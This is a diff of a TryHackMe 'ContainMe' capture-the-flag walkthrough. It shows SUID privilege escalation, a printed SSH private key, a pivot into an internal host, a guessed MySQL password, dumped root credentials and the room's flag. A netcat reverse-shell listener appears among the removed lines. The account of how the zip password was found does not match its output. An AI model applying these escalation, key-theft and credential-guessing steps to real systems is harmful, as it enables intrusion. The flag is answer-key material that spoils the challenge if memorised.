@@ -1,8 +1,26 @@
 # <div align="center">[ContainMe - TryHackMe Walkthrough](https://tryhackme.com/room/containme1)</div>
 <div align="center">Where am I ? Catch me</div>
-<div align="center"></div>
+<div align="center">
+	<img width="200" height="200" alt="89eaf880161ad2a96f0a8000b5f9ab57" src="https://github.com/user-attachments/assets/a85556bf-b9b8-4945-b981-906a06d46840" />
+</div>
 
-# ContainMe - TryHackMe Walkthrough
+## Task 1. Find the flag
+
+```
+No answer needed
+```
+## Task 2. Find the one and only flag
+
+Good luck finding the flag!
+
+### What is the flag?
+```
+THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
+```
+## Introduction
+ContainMe was a fun medium difficulty TryHackMe room focused around web exploitation, containerized environments, lateral movement, and internal enumeration. What initially looked like a simple web challenge slowly turned into a multi-stage pivot across different hosts inside the network.
+
+In this walkthrough, I’ll cover the exact steps I followed to get initial access, escalate privileges inside the container, pivot into the internal host, and finally capture the root flag.
 
 ## Initial Access
 
@@ -169,42 +187,53 @@ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Now I had a proper interactive shell and could continue enumerating the system further.
 
-## Escalation
-Now that we have access to an account, let’s attempt to escalate our privileges from the “mike” account to root.
+## Privilege Escalation Enumeration
 
-```
+After getting the reverse shell, I started enumerating the system manually to look for anything unusual.
+
+I moved into Mike’s home directory and found a binary named `1cryptupx`.
+
+```bash id="gq8v1m"
 www-data@host1:/var/www/html$ cd /home/mike
-cd /home/mike
 www-data@host1:/home/mike$ ls
-ls
+
 1cryptupx
+```
+
+I initially tried checking the binary using common utilities, but most of them were missing from the container.
+
+```bash id="p8kz2n"
 www-data@host1:/home/mike$ file 1cryptupx
-file 1cryptupx
 bash: file: command not found
+
 www-data@host1:/home/mike$ string 1cryptupx
-string 1cryptupx
 bash: string: command not found
+```
+
+So I executed it directly to see what it did.
+
+```bash id="r3mty9"
 www-data@host1:/home/mike$ ./1cryptupx
-./1cryptupx
+```
+
+```text
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
 ██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
 ██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
 ╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
 ░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+```
 
-www-data@host1:/home/mike$ 
-```
-What the hell i though this would have some details
+The binary only printed a banner and did not reveal much information.
 
-i just randomaly try bez its medium levl lab to check suid perm file 
-```
-find / -user root -perm /4000 2>/dev/null
-```
-and i got one 
-```
+At that point, I switched to checking for SUID binaries.
+
+```bash id="j7xq4r"
 www-data@host1:/home/mike$ find / -user root -perm /4000 2>/dev/null
-find / -user root -perm /4000 2>/dev/null
+```
+
+```text
 /usr/share/man/zh_TW/crypt
 /usr/bin/newuidmap
 /usr/bin/newgidmap
@@ -224,120 +253,125 @@ find / -user root -perm /4000 2>/dev/null
 /bin/umount
 /bin/fusermount
 /bin/ping6
-www-data@host1:/home/mike$ 
 ```
-This file is little wierd `/usr/share/man/zh_TW/crypt`
-Checking one of the files looks like it’s owned by root and we can execute it.
 
+One file immediately stood out.
+
+```text
+/usr/share/man/zh_TW/crypt
 ```
+
+That path looked unusual for a SUID binary, so I checked its permissions.
+
+```bash id="t6nw5p"
 www-data@host1:/home/mike$ ls -la /usr/share/man/zh_TW/crypt
-ls -la /usr/share/man/zh_TW/crypt
+
 -rwsr-xr-x 1 root root 358668 Jul 30  2021 /usr/share/man/zh_TW/crypt
-www-data@host1:/home/mike$ 
 ```
-since i got nothing, why not running the script with -h or — help and see what it can tell me before moving it into my machine but here is where it comes interesting
+
+The binary was owned by `root` and had the SUID bit enabled.
+
+Before transferring it locally for analysis, I decided to interact with it directly using different arguments.
+
+```bash id="c9qk2v"
+www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -h
 ```
-death@esther:~$ nc -lnvp 1234
-Listening on 0.0.0.0 1234
-Connection received on 10.49.172.109 35590
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-www-data@host1:/var/www/html$ file /usr/share/man/zh_TW/crypt
-file /usr/share/man/zh_TW/crypt
-bash: file: command not found
-www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -h  
-/usr/share/man/zh_TW/crypt -h
-░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
-██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
-██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
-██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
-╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
-░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 
-
+```text
 You wish!
+```
+
+Then I tried another argument.
+
+```bash id="m4u8zr"
 www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -a
-/usr/share/man/zh_TW/crypt -a
-░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
-██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
-██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
-██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
-╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
-░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+```
 
+```text
 Unable to decompress.
+```
+
+At this point, I started testing random inputs against the binary. Surprisingly, passing the username `mike` immediately dropped me into a root shell.
+
+```bash id="x8bn6s"
 www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt mike
-/usr/share/man/zh_TW/crypt mike
-░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
-██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
-██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
-██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
-╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
-░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+```
 
+```text
 root@host1:/var/www/html# whoami
-whoami
 root
-root@host1:/var/www/html# cd /root
-cd /root
-root@host1:/root# ls
-ls
-```
-After passing some argument i goot root by typing
-```
-/usr/share/man/zh_TW/crypt mike
-```
-But twist is there is no root now the main issue is where is the flag
-For a sec i There’s no flag. This is where the room’s name, “ContainMe,” really clicks. We’re root, but we’re root inside a container. Let’s check the network interfaces.
-When i check id it clearfy everthing
-```
-root@host1:/home/mike# id
-id
-uid=0(root) gid=33(www-data) groups=33(www-data)
-root@host1:/home/mike# 
 ```
 
-We have two network interfaces. This confirms we’re on an internal network. The other host we need to get to is likely on that 172.16.20.0/24 network. Let’s grab Mike’s SSH private key from /home/mike/.ssh/id_rsa and use it to pivot.
+I finally had root access.
+
+---
+
+## Root Access
+
+After getting the root shell, I moved into `/root` expecting to find the flag immediately.
+
+```bash id="y5dv1q"
+root@host1:/var/www/html# cd /root
+root@host1:/root# ls
 ```
+
+But there was no flag.
+
+For a moment, it felt strange. Then the room name started making sense.
+
+`ContainMe`
+
+I checked the current user context.
+
+```bash id="e2rh7k"
+root@host1:/home/mike# id
+
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+Even though I had root privileges, the environment clearly looked restricted. That confirmed I was inside a container rather than the actual host machine.
+
+To verify that theory, I checked the network interfaces.
+
+```bash id="w3mj8p"
 root@host1:/root# ifconfig
-ifconfig
+```
+
+```text
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
-        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
-        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
-        RX packets 332  bytes 25980 (25.9 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 491  bytes 417844 (417.8 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
-        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
-        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
-        RX packets 34  bytes 2692 (2.6 KB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 30  bytes 2276 (2.2 KB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
 lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         inet 127.0.0.1  netmask 255.0.0.0
-        inet6 ::1  prefixlen 128  scopeid 0x10<host>
-        loop  txqueuelen 1000  (Local Loopback)
-        RX packets 438499  bytes 103078341 (103.0 MB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 438499  bytes 103078341 (103.0 MB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
 
-root@host1:/root# 
-```
-Crazy let get ssh key
-```
+The second interface confirmed there was another internal network reachable from the container.
+
+At this stage, the objective shifted from container root access to pivoting deeper into the environment.
+
+## Lateral Movement
+
+At this point, I had root access inside the container, so I started looking for anything useful that could help me move further into the environment.
+
+Inside Mike’s home directory, I found SSH keys stored under `.ssh`.
+
+```bash id="n8f2qw"
 root@host1:/root# cd /home/mike
-cd /home/mike
 root@host1:/home/mike# ls .ssh
-ls .ssh
+
 id_rsa  id_rsa.pub
+```
+
+I dumped the private key.
+
+```bash id="z3k7mv"
 root@host1:/home/mike# cat .ssh/id_rsa
-cat .ssh/id_rsa
+```
+
+```text id="u7xq5d"
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
 YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
@@ -365,142 +399,178 @@ yHCJfWcCgYAFzAx6hwi9smlvCpoZ1D8TRyqlxKf4YtSkTl74ZyiRESfvpuZSiclg
 mFdVoHOt+gkpsXkmGmuqymIBRYGEw3dJ2C4MRPjx0UFpua0BAZ5k0ly6eaZuejWj
 0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
 -----END RSA PRIVATE KEY-----
-root@host1:/home/mike# 
 ```
-Now, from inside our container (host1), let’s try to SSH into the other host (host2). The other host’s IP is likely on the same subnet. Let’s try to guess or scan for it. A common convention is to use .1 for the gateway and other low numbers for hosts. After some quick scanning (or guessing), we can find the other host at 172.16.20.6.
+
+Now that I had Mike’s SSH private key, I started looking for another reachable host inside the internal network.
+
+Based on the network configuration discovered earlier, the second machine appeared to be reachable through the `172.16.20.0/24` subnet. After a bit of guessing and quick checking, I identified another host at `172.16.20.6`.
+
+I used the private key to SSH into it.
+
+```bash id="a2v4rx"
+$ ssh mike@172.16.20.6 -i id_rsa
 ```
-ssh mike@172.16.20.6 -i id_rsa
-```
-we r into host2 machine
-```
+
+The login worked immediately.
+
+```bash id="d7m8py"
 root@host1:/home/mike/.ssh# ssh mike@172.16.20.6 -i id_rsa
-ssh mike@172.16.20.6 -i id_rsa
+
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.15.0-139-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-This system has been minimized by removing packages and content that are
-not required on a system that users do not log into.
-
-To restore this content, you can run the 'unminimize' command.
-
-1 update can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 Last login: Sat May 23 17:22:48 2026 from 172.16.20.2
-mike@host2:~$ id 
-id 
+
+mike@host2:~$ id
+
 uid=1001(mike) gid=1001(mike) groups=1001(mike)
-mike@host2:~$ 
 ```
 
-after taking a small brake since my brain is now smoking, i tried to check for services running and ports and i found mysql port 3306 open internally
+At this stage, I was finally inside `host2`.
 
-```
-ss -tulnp
-```
-```
+After taking a short break because the room was already turning into a maze, I started enumerating services and listening ports on the new machine.
+
+```bash id="f5k1zs"
 mike@host2:~$ ss -tulnp
-ss -tulnpss -tulnp
-Total: 104 (kernel 0)
-TCP:   33 (estab 2, closed 27, orphaned 0, synrecv 0, timewait 0/0), ports 0
+```
 
-Transport Total     IP        IPv6
-*	  0         -         -        
-RAW	  1         0         1        
-UDP	  1         1         0        
-TCP	  6         5         1        
-INET	  8         6         2        
-FRAG	  0         0         0        
-
+```text id="m0j4vq"
 Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
+
 udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
+
 tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
+
 tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
+
 tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
+
 tcp    LISTEN   0        128                  [::]:22               [::]:*      
-mike@host2:~$ 
 ```
-OK now there is 3306 as we know this port represent mysql service
-I tried to login in to MySQL using mike as username and tried some random passwords since i don’t have one and the one worked was : password
-```
+
+One thing immediately stood out.
+
+Port `3306` was listening locally on `127.0.0.1`, which meant MySQL was running internally on the machine.
+
+## Credential Discovery
+
+Since MySQL was running locally on port `3306`, I tried authenticating with the current user account.
+
+I used `mike` as the username and started trying a few simple passwords. Surprisingly, one of the guesses worked.
+
+```bash id="q7m4vx"
 mike@host2:~$ mysql -u mike -p
-mysql -u mike -p
+
 Enter password: password
 ```
-Press enter or click to view image in full size
-```
+
+Once inside the database, I started enumerating the available databases and tables.
+
+```sql id="t5x9rb"
 mysql> show databases;
-show databases;
+```
+
+```text id="k2q8wp"
 +--------------------+
 | Database           |
 +--------------------+
 | information_schema |
 | accounts           |
 +--------------------+
-2 rows in set (0.00 sec)
+```
 
+The `accounts` database immediately looked interesting.
+
+```sql id="m3f6yu"
 mysql> use accounts;
-use accounts;
-Database changed
+```
+
+```sql id="d8n1kt"
 mysql> show tables;
-show tables;
+```
+
+```text id="x0z5mq"
 +--------------------+
 | Tables_in_accounts |
 +--------------------+
 | users              |
 +--------------------+
-1 row in set (0.00 sec)
+```
 
+I dumped the contents of the `users` table.
+
+```sql id="w6p2gh"
 mysql> select * from users;
-select * from users;
+```
+
+```text id="n4y7cb"
 +-------+---------------------+
 | login | password            |
 +-------+---------------------+
 | root  | bjsig4868fgjjeog    |
-| mike  | ca |
+| mike  | ca                  |
 +-------+---------------------+
-2 rows in set (0.00 sec)
+```
 
-mysql>
-```
-bang !! we got pass 
-```
+That finally gave me credentials for the root account.
+
+---
+
+## Root Access
+
+I used the recovered password to switch to the root user.
+
+```bash id="v8j3ms"
 mike@host2:~$ su root
-su root
-Password: bjsig4868fgjjeog
 
+Password: bjsig4868fgjjeog
+```
+
+The password worked.
+
+```bash id="y1r9kv"
 root@host2:/home/mike# cd /root
-cd /root
 root@host2:~# ls
-ls
+
 mike.zip
-root@host2:~#
 ```
-What we still not get flag there is an mike.zip 
-```
+
+At first, I expected the flag to be directly inside `/root`, but instead there was a ZIP archive named `mike.zip`.
+
+I extracted it.
+
+```bash id="c5u7xa"
 root@host2:~# unzip mike.zip
-unzip mike.zip
+```
+
+```text id="r4z8pd"
 Archive:  mike.zip
 [mike.zip] mike password: WhatAreYouDoingHere
 
- extracting: mike                    
+ extracting: mike
+```
+
+The archive requested Mike’s password, and the credentials recovered from the database worked successfully.
+
+After extraction, a file named `mike` appeared inside the directory.
+
+```bash id="b2n6qw"
 root@host2:~# ls
-ls
+
 mike  mike.zip
 ```
-It ask for mike password and i tried the password we get from database
 
-## Root flag
-```
-root@host2:~# cat mike	
-cat mike
+---
+
+## Root Flag
+
+Finally, I opened the file and grabbed the root flag.
+
+```bash id="h9x4tj"
+root@host2:~# cat mike
+
 THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
 ```
 
-Crazy lab thanks for till here guys if u like this i really appricate it 
+This room turned out to be far more interesting than I expected. What started as a simple web enumeration challenge slowly unfolded into container escape style pivoting, internal network discovery, SSH lateral movement, and credential hunting across multiple hosts.
+
 <img width="857" height="399" alt="image" src="https://github.com/user-attachments/assets/5c00631f-7413-4a4c-81f0-b4158c4c0ce7" />
